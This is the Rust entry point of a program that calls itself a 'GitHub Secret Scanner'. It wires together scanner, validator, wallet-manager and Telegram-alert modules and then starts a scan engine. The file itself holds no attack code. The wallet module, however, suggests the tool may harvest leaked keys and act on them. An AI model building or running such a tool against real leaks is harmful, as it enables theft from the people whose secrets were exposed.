mod config;
mod core;
mod scanner;
mod patterns;
mod validators;
mod wallet;
mod telegram;
mod monitor;
mod models;
mod storage;

use std::sync::Arc;
use tracing::{info, error};
use dotenv::dotenv;

#[global_allocator]
static ALLOC: jemallocator::Jemalloc = jemallocator::Jemalloc;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    dotenv().ok();
    
    tracing_subscriber::fmt()
        .with_max_level(tracing::Level::INFO)
        .with_target(false)
        .init();

    info!("🚀 Starting GitHub Secret Scanner...");
    
    let config = config::Config::from_env()?;
    let config = Arc::new(config);
    
    info!("✅ Configuration loaded");
    
    let _store = storage::file_store::FileStore::new();
    info!("✅ File storage initialized");
    
    let wallet_manager = match wallet::manager::WalletManager::new(config.clone()) {
        Ok(wm) => {
            info!("✅ Wallet manager initialized");
            Arc::new(wm)
        }
        Err(e) => {
            error!("❌ Wallet manager failed: {}", e);
            return Err(e.into());
        }
    };
    
    let telegram = telegram::alerts::TelegramAlerts::new_optional(config.clone());
    
    let cache = core::cache::CacheManager::new();
    
    let scan_engine = scanner::engine::ScanEngine::new(
        config.clone(),
        cache.clone(),
        telegram.clone(),
        wallet_manager.clone(),
    );
    
    info!("🔧 Starting scanner engine...");
    
    scan_engine.run().await;
    
    Ok(())
}